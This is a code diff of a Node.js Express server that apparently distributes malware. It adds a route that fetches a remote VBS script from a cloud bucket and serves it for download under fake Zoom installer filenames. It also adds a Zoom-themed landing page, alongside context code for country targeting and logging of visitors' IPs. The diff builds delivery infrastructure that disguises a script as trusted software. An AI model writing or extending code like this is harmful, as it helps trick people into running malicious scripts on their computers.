@@ -211,7 +211,7 @@ function isTargetCountry(req) {
 }
 
 // ======= Middleware =======
-app.set('trust proxy', true);
+app.set('trust proxy', false);
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(globalLimiter);
@@ -273,22 +273,38 @@ app.use((req, res, next) => {
 
 
 // ======= VBS Download Proxy =======
-app.get('/download/vbs', async (req, res) => {
+app.get('/download/vbs/:type', async (req, res) => {
     try {
+        const { type } = req.params;
         const vbsUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
         
         const response = await fetch(vbsUrl);
         const data = await response.text();
         
-        // Set proper download headers
+        // Dynamic filename based on type
+        let filename;
+        switch(type) {
+            case 'workplace':
+                filename = 'Zoom_Workplace_Setup.vbs';
+                break;
+            case 'browser':
+                filename = 'Zoom_Browser_Setup.vbs';
+                break;
+            default:
+                filename = 'Zoom_Workplace.vbs';
+        }
+        
+        // Set proper download headers with dynamic filename
         res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', 'attachment; filename="adobeinstv267.vbs"');
+        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
         res.setHeader('Content-Length', Buffer.byteLength(data));
         
         res.send(data);
         
         log('info', { 
             event: 'vbs_download', 
+            type: type,
+            filename: filename,
             ip: getClientIp(req), 
             size: Buffer.byteLength(data)
         });
@@ -306,6 +322,10 @@ app.get('/download/vbs', async (req, res) => {
 // ======= Routes =======
 app.get('/', (req, res) => {
   return res.sendFile(path.join(__dirname, 'pages', 'home.html'));
+});
+
+app.get('/zoom', (req, res) => {
+  return res.sendFile(path.join(__dirname, 'pages', 'zoom.html'));
 });
 
 app.get('/download/id/:fileId', (req, res) => {
